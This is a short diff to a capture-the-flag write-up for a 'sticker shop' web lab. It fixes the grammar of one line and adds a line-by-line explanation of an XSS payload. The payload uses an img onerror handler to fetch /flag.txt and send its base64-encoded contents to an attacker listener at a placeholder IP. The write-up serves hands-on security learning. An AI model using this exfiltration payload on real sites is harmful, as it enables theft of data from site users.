@@ -7,7 +7,7 @@ If we enter in the IP we don't have access to the flag
 
 <img width="498" height="216" alt="image" src="https://github.com/user-attachments/assets/f5dd1fc6-9c10-4540-8fa8-af3f100829d9" />
 
-Isn't not so easy how pretend
+It's not as easy as it seems.
 
 Then, we delete /flag.txt in the URL, we got the kitty shop (sticker shop)
 
@@ -112,6 +112,14 @@ fetch('/flag.txt')
   fetch('http://<IP>:443/?flag=' + btoa(data))
 })
 </script>"
+
+"<img src=x onerror=" ... ">" We call a imagen that not exists
+"fetch('/flag.txt')"    We call the flag.txt
+".then(r=>r.text())"    Fetch() returns a promise, r is the request, .text convert the string in plaintext
+btoa(data)              Encode the data in base64, why? for not brek the output
+
+
+
 
 We start the listener, and submit the script 
 
